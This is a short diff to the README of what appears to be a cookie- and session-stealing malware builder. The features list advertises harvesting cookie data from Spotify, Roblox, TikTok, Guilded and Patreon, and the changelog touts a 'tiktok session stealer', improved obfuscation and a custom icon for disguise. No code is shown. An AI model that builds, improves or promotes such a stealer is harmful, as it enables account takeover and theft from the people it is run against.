@@ -32,7 +32,7 @@
 
 ## <a id="features"></a>✨・Features
 ```
-🖼️ - Custom icon
+🖼️ - Custom icon (Put custom icon (.ico format))
 
 🤖 - Website Cookie Information (Spotify, Roblox, Tiktok, Guilded, Patreon)
 
@@ -81,6 +81,7 @@
 
 ## <a id="Changelog"></a>📝・Changelog
 ```
+- V4.6 Better Looking Obfuscation and added Custom Icon
 - V4.5.5 More Cookie Information website (+3) and fixed on obfuscator error
 - V4.5 Added tiktok session stealer
 - V4.4.8 Better obfuscator
